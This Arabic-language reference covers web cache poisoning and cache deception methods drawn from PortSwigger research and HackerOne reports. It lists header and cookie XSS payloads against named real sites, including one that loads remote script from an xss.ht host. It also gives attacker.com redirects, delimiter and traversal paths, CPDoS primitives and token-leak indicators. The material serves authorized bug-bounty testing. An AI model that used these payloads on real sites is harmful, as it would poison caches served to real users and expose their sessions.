# قاعدة المعرفة المستخرَجة — Web Cache Poisoning & Web Cache Deception

> استُخرجت هذه القاعدة من **99 تقرير/لاب/بحث** موجودة في الأرشيف الذي رفعته، وهي نفسها التقنيات التي رُمِّزت داخل إضافة **Cache Hunter** (ملف `TechniqueLibrary.java`). كل تقنية مرفقة بمصدرها.

## المصادر الأساسية

- **PortSwigger Research (James Kettle):** «Practical Web Cache Poisoning» (2018)، «Web Cache Entanglement» (2020)، «Gotta cache 'em all: bending the rules of web cache exploitation» (2024)، «Responsible denial of service with web cache poisoning».
- **PortSwigger Web Security Academy:** كل لابات Poisoning + Deception وحلولها (ومستودع rodnt/PortSwiggerLabs).
- **مراجع مجمّعة:** HackTricks، PayloadsAllTheThings، Application Security Cheat Sheet، منهجية bombon، ملاحظات rodnt.
- **بحث أكاديمي:** «Web Cache Deception Escalates!» (USENIX)، cpdos.org.
- **~60 تقرير HackerOne حقيقي:** Shopify, PayPal, GitLab, Mozilla, Cloudflare, Expedia, Algolia, Discourse, Kaspersky, Semrush, TikTok, Smule, Square, Nextcloud, Greenhouse, Exodus, U.S. DoD, GSA, ok.ru, Omise, Basecamp, Acronis, Chaturbate, Lyst, Postmates …

---

## 1) الفرق الجوهري

- **Web Cache Poisoning:** المهاجم يجعل الكاش يخزّن **ردّاً خبيثاً** يُقدَّم لبقية المستخدمين (XSS، redirect، JS injection، DoS).
- **Web Cache Deception:** المهاجم يخدع الكاش ليخزّن **محتوى حسّاساً خاصاً بضحية** (توكِنات، CSRF، بيانات حساب)، ثم يجلبه المهاجم لاحقاً.

---

## 2) المنهجية العامة (3 خطوات) + Cache Buster

1. **تحديد المدخلات غير المُفهرَسة (Unkeyed inputs):** عناصر لا تدخل في «cache key» لكنها تغيّر الرد (headers، cookies، params).
2. **استخراج رد ضار (Elicit):** كيف يُعقَّم المُدخَل وأين ينعكس؟ هل يمكن XSS/redirect/DoS؟
3. **ضمان التخزين (Get it cached):** يعتمد على الامتداد، content-type، المسار، status، وheaders الكاش.

> **Cache Buster إلزامي أثناء الاختبار:** أضف بارامتراً فريداً في كل طلب (مثل `?cbust=<random>`) لعزل «cache key» الخاص بك فلا تسمّم مستخدمين حقيقيين. (إضافة Cache Hunter تفعل هذا تلقائياً في كل probe.)

---

## 3) Headers الكاش — للكشف والتأكيد

**مؤشّرات وجود كاش / HIT-MISS:**
`X-Cache` (hit/miss)، `CF-Cache-Status` (HIT/MISS)، `X-Cache-Status`، `X-Proxy-Cache`، `X-Varnish`، `X-Served-By`، `X-Cache-Hits`، `Age` (>0 = مخزَّن)، `Via`، `X-Drupal-Cache`، `X-Litespeed-Cache`، `CDN-Cache-Control`، `Cache-Status`، `Surrogate-Control/Surrogate-Key`، وعلى Akamai: `Server-Timing: cdn-cache; desc=HIT`.

**التحكم بالتخزين:** `Cache-Control: public | private | no-store | no-cache | max-age=N`، `Pragma`، `Expires`، `Vary` (يحدّد headers إضافية تُعامَل كجزء من المفتاح — مثل `Vary: User-Agent`)، `ETag`/`Last-Modified` (validators).

**Cache-key oracle (كشف كيفية بناء المفتاح) — Akamai:**
```
GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key
→ X-Cache-Key: innocent-website.com/?param=1
```
Pragmas أخرى: `akamai-x-cache-on`, `akamai-x-check-cacheable`, `akamai-x-get-extracted-values`, `akamai-x-get-true-cache-key`.

---

## 4) Web Cache Poisoning — التقنيات والبايلودات

### 4.1 Headers غير مُفهرَسة (الأكثر أهمية)

**Host / بناء URL (الأشيَع — `X-Forwarded-Host` ظهر في 112 ملفاً):**
```
X-Forwarded-Host, X-Host, X-Forwarded-Server, X-Forwarded, Forwarded (host=),
X-Original-Host, X-Forwarded-For, True-Client-IP, Client-IP, X-Real-IP
```
مثال reflected XSS عبر og:image (Red Hat — Kettle):
```
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>
→ <meta property="og:image" content="https://a."><script>alert(1)</script>"/>
```
مثال استيراد JS خبيث (unity3d.com — Kettle):
```
GET / HTTP/1.1
Host: unity3d.com
X-Host: portswigger-labs.net
→ <script src="https://portswigger-labs.net/sites/files/foo.js"></script>
```

**Scheme (redirect/scheme) — يُدمَج مع X-Forwarded-Host:**
```
X-Forwarded-Scheme, X-Forwarded-Proto, X-Forwarded-Protocol, X-Forwarded-SSL, X-Url-Scheme, Front-End-Https
```
Open redirect بدمج headerين (Kettle):
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
→ 301 Location: https://attacker.com/en
```

**Port:** `X-Forwarded-Port` — منفذ غير صالح ⇒ redirect لمنفذ ميّت (DoS)؛ منفذ غير رقمي ⇒ XSS.
```
GET /index.php?dontpoisoneveryone=1 HTTP/1.1
Host: www.hackerone.com
X-Forwarded-Port: 123      →  302 Location: https://www.hackerone.com:123/   (HackerOne، $2,500)
```

**URL override (Symfony/توجيه):** `X-Original-URL`, `X-Rewrite-URL`, `X-Override-URL`, `X-Forwarded-Path`, `X-Forwarded-Prefix`, `X-Forwarded-URI`, `X-Forwarded-URL`.
```
GET /anything HTTP/1.1
Host: unity.com
X-Original-URL: /admin      →  200 (تجاوز 403)
```

**Method override (يُنتج 200 قابلاً للتخزين بجسم فارغ ⇒ DoS للملفات الستاتيكية):** `X-HTTP-Method-Override`, `X-Method-Override`, `X-HTTP-Method`.
```
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD   →  200 Content-Length: 0 (GitLab)
```

**طريقة الكشف عن unkeyed header:** أضف قيمة فريدة (canary مثل `<token>.evil.com`)، ابحث عنها في الجسم أو في `Location`، ثم أعد الطلب **بدون** الـheader بنفس الـbuster؛ إن بقيت القيمة ⇒ الرد مُخزَّن ⇒ تسميم مؤكَّد. صنّف الخطورة حسب سياق الانعكاس (`src=`, `href=`, `content=`, `<script>`, `Location` = خطير/XSS/redirect).

### 4.2 Cookies غير مُفهرَسة
بارامترات شائعة: `language, locale, country, region, currency, fehost, hav, n_vis, session_id, theme`.
```
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=…; fehost=asd"%2balert(1)%2b"        (Kettle)
Cookie: n_vis=xssx'*$.getScript`//593.xss.ht`//;      (bombon، $1,000 — تجاوز WAF عبر jQuery)
```

### 4.3 Fat GET
الكاش يُفهرِس بارامتر الـURL، والخادم يستخدم بارامتر الـbody:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

### 4.4 Parameter Cloaking (تباين تحليل البارامترات)
```
دمج علامة استفهام:   /?example=123?excluded_param=payload
Rails (فاصلة منقوطة):  /?keyed=abc&excluded=123;keyed=payload   (Rails يأخذ آخر تكرار)
JSONP callback:        /jsonp?callback=innocentFunction         (تجاوز الدالة ⇒ JS تعسّفي)
```

### 4.5 Query string / params غير مُفهرَسة
بارامترات تحليلية تُستبعَد عادةً من المفتاح: `utm_content, utm_source, utm_medium, utm_campaign, utm_term, gclid, fbclid, mc_cid, callback, cb`. إن انعكس البارامتر وكان الرد قابلاً للتخزين ⇒ تسميم.

### 4.6 Cache Key Injection
- **منفذ غير مُفهرَس:** `Host: site.com:1337` يُنعكس في `Location` بينما المفتاح يهمل المنفذ ⇒ DoS/XSS.
- **حساسية حالة الأحرف:** `Host: TaRgEt.CoM` (Cloudflare يطبّع المفتاح لكن يمرّر الحالة الأصلية للأصل).
- **بارامتر مُرمَّز:** `size` مُفهرَس لكن `siz%65=0` يُهمَل من المفتاح ويُستخدَم في الأصل ⇒ `400` قابل للتخزين (Fastly/Varnish).

---

## 5) Web Cache Deception — التقنيات والبايلودات

الفكرة: اجعل المسار يبدو **ملفاً ستاتيكياً** (بامتداد/محدِّد/تطبيع) فيخزّنه الكاش، بينما يردّ الأصل بمحتوى المستخدم الحسّاس.

### 5.1 امتدادات ستاتيكية (قائمة Cloudflare/Akamai الافتراضية)
```
css js json xml txt map
jpg jpeg png gif bmp ico svg svgz webp avif tif tiff pict
woff woff2 ttf otf eot
mp3 mp4 mid midi ogg flac avi mkv webm mov wmv pls
pdf doc docx xls xlsx ppt pptx ps eps rtf csv ejs
zip gz gzip bz2 zst 7z rar tar apk dmg iso bin jar class exe swf dll
```
**تجاوز «Cache Deception Armor» في Cloudflare عبر `.avif`** (bombon / HackerOne #1391635).

### 5.2 Path Mapping (REST)
الأصل يفسّر المقطع الزائد كبارامتر غير مهم، والكاش يرى `.css`:
```
http://example.com/user/123/profile/wcd.css   →  محتوى /user/123/profile مخزَّن كـCSS
/api/orders/123/foo.js                          (اختبار: هل يعيد نفس بيانات /api/orders/123؟)
```

### 5.3 Delimiters (محدِّدات حسب الإطار)
| المحدِّد | الإطار/الخادم | مثال |
|---|---|---|
| `;` | Spring/Java (matrix vars)، Ruby | `/profile;foo.css` |
| `.` + امتداد | Ruby on Rails (formatter) | `/profile.css` |
| `%00` (null مُرمَّز) | OpenLiteSpeed | `/profile%00foo.js` |
| `%0a`/`%0d` (newline مُرمَّز) | Nginx (rewrite) | `/users/MyAccount%0aaaa` |
| `%23` (# مُرمَّز) | ديكودينغ الكاش/الأصل | `/profile%23wcd.css` |
| `%3f` (? مُرمَّز) | قواعد الكاش على المسار المُرمَّز | `/myaccount%3fwcd.css` |

**طريقة الكشف عن محدِّد:** أرسل `/home` (R0)، ثم `/homeXYZ` (R1)، ثم `/home<DELIM>XYZ` (R2). إن كان R2==R0 فالحرف محدِّد (جرّب مُرمَّزاً وغير مُرمَّز؛ خصوصاً `%00 %0a %0d %09 %3b %2e`).

### 5.4 Normalization / Path Traversal
تباين تطبيع النقاط والـslash بين الكاش والأصل يتيح رَبْط مجلد قابل للتخزين على مسار ديناميكي:
```
/static/..%2fprofile          (الأصل يطبّع إلى /profile؛ الكاش يرى /static/..%2fprofile)
/wcd/..%2fprofile
/{DIR}/%2e%2e%2f{BASE}   ،   /{DIR}/..%5c{BASE}   ،   /{DIR}/..%255c{BASE}
```
> كل نقطة في تسلسل الـtraversal يجب أن تكون **مُرمَّزة** وإلا طبّعها المتصفّح قبل الإرسال.

### 5.5 Static Directories
مجلدات يخزّنها الـCDN كاملةً غالباً: `static assets resources public content media images img js css fonts dist build cdn-cgi _next wp-content sites/files`.

### 5.6 منهجية الكشف + التأكيد (Deception)
1. سجِّل رداً مصادَقاً عليه (فيه Cookie/توكِن) وبصمته (طول الجسم + مؤشّرات حسّاسة).
2. أرسل المتغيّر (امتداد/محدِّد/تطبيع) **مع كوكيز الضحية** + buster.
3. إن أعاد **نفس محتوى الأساس** (الأصل تجاهل اللاحقة) **وكان قابلاً للتخزين** (كان الأساس غير قابل والآن أصبح قابلاً = إشارة قوية) ⇒ مرشَّح.
4. **تأكيد:** اطلب نفس المتغيّر **بدون كوكيز** (مجهول)؛ إن حصلت على المحتوى الحسّاس نفسه أو `X-Cache: HIT` ⇒ **ثغرة مؤكَّدة (Critical)**.

مؤشّرات حسّاسة للتأكيد: `csrf, xsrf, authenticity_token, eyJ (JWT), api_key, access_token, bearer, session, logout, "email", @, account_id, "balance", secret`.

### 5.7 أنماط متقدّمة من التقارير
- **HTML مصادَق عليه + buster:** صفحة تُرجِع `X-Cache: MISS` ثم `HIT` عند الإعادة، بـ`Cache-Control` يسمح بالمشاركة، وتحوي JWT/CSRF/إيميل في الجسم ⇒ اعزل المفتاح بـ`?cacheBuster=1`.
- **CSPT + امتداد:** Client-Side Path Traversal في SPA يحقن `../../v1/token.css` فيُكتَب توكِن الضحية في مفتاح عام (ChatGPT/OpenAI).
- **SameSite=Lax:** الكوكيز الافتراضية لا تُرسَل مع طلبات فرعية عبر المواقع (`<img>`, `<script>`) ⇒ قد لا يُملأ الكاش إلا برد مجهول.

---

## 6) Cache Poisoning DoS (CPDoS)

ثلاث فئات (cpdos.org): **HHO** (Header Oversize)، **HMC** (Meta Character)، **HMO** (Method Override). كلها تُنفَّذ مع cache-buster لتكون آمنة (تصيب مفتاحك فقط).

**Header primitives** (تُنتِج خطأً قابلاً للتخزين):
```
X-Metachar-Oversize: \        (Akamai backslash → 400 قابل للتخزين — bombon $1,000)
X-HTTP-Method-Override: HEAD  (جسم فارغ 200 — GitLab)
Transfer-Encoding: cow        (501/خطأ — PayPal $9,700، Bitbucket $1,800)
Range: bytes=cow              (400 — Twitter abs.twimg.com)
Accept-Encoding: br           (فرض brotli — Instagram $1,000)
Accept_Encoding: br           (شرطة سفلية تُفوِّت الـcache key)
Accept: cow/cow               (406/400)
X-Forwarded-SSL: off          (Contradictory scheme headers — Bitbucket)
X-Forwarded-Port: 1 / 123     (منفذ ميّت / timeout — HackerOne $2,500)
Max-Forwards: 0  ،  Upgrade   ،  Origin
Content-Type: invalid-value   (حالة خطأ قابلة للتخزين — GitHub repo DoS)
```
**HHO:** header ضخم (~8KB) ⇒ `400/431` قابل للتخزين.

**Query primitives:**
```
NULL bytes:  ?x=%00%00%00…                                   (Greenhouse #334709)
Param arrays:?for[]=1&for[]=2&…                              (Greenhouse #326639)
Oversize:    ?x=AAAA…(4KB)  ،  URLs طويلة جداً → 414
```
**PURGE:** بعض المواقع تكرم فعل `PURGE` (GitHub، GitLab) ⇒ يمسح الإدخال السليم ويجبر إعادة التسميم.

**كشف بسيط:** أرسل primitive بخطأ + buster؛ إن أصبح الرد `4xx/5xx` أو فارغاً **وقابلاً للتخزين**، ثم بقي كذلك عند إعادة الطلب ⇒ CPDoS مؤكَّد.

---

## 7) دراسات حالة حقيقية (مختارات من التقارير)

| الجهة / التقرير | التقنية | النقطة |
|---|---|---|
| Shopify #977851 | Poisoning → XSS | `X-Forwarded-Host` |
| Shopify #1096609 / #1695604 | DoS | Host header / cache poisoning على CDN |
| PayPal #488147 | Stored XSS | cache poisoning على `/signin` |
| PayPal #622122 | DoS | `Transfer-Encoding` غير صالح |
| GitLab #1160407 | DoS | `X-HTTP-Method-Override`/GCP + Varnish |
| Mozilla #1976449 / #2860983 | DoS | cache poisoning على static |
| Expedia #1760213 | Stored XSS → ATO | كوكي `hav` |
| Expedia #1698316 | Deception → ATO | امتداد ستاتيكي |
| Algolia #504261 / #1530066 | Deception (XSS/PII) | `.css` suffix |
| Discourse #260697 / #394016 | Deception → ATO | Cloudflare + no-cache مفقود |
| Cloudflare #1391635 | Armor bypass | `.avif` |
| Smule #504514 | Poisoning | تسريب CSRF + `X-Smulen` |
| Greenhouse #326639 / #334709 | DoS | param arrays / NULL bytes |
| U.S. DoD #1183263 / #1322732 | Poisoning / DoS | Host-based |
| Postmates ($1,500) | Poisoning | unkeyed input |

---

## 8) أدوات مذكورة في المصادر

- **PortSwigger Param Miner** — تخمين headers/params غير مُفهرَسة + cache-buster تلقائي + خيار «twitchy cache poison».
- **Web Cache Vulnerability Scanner (WCVS)** — `wcvs -u example.com`.
- **Web Cache Deception Scanner (BApp)** + Burp Scanner (يكتشف deception عبر path-mapping تلقائياً).
- **Cache Hunter** (هذه الإضافة) — يؤتمِت كل ما سبق في الوقت الفعلي داخل Burp.

---

## 9) ملاحظة تفويض

كل ما سبق للاختبار **المصرّح به** فقط (لابات PortSwigger، أو أهداف ضمن نطاق bug-bounty/pentest مصرّح). استخدم دائماً cache-buster لإثبات الثغرة دون الإضرار بمستخدمين حقيقيين.
